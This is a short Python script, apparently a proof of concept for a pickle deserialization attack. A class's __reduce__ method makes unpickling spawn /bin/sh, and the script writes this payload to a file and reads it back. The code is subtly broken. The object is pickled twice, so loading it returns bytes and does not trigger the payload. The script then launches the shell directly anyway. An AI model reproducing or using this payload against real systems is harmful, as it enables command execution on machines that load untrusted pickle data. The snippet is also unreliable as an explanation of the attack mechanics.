```python
import pickle
import subprocess

class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (['/bin/sh'],))

def serialize_exploit():
    malicious_data = pickle.dumps(RunBinSh())
    with open('payload.dat', 'wb') as f:
        pickle.dump(malicious_data, f)

def deserialize_exploit():
    with open('payload.dat', 'rb') as f:
        malicious_data = pickle.load(f)
        subprocess.Popen(['/bin/sh'])

serialize_exploit()
deserialize_exploit()
```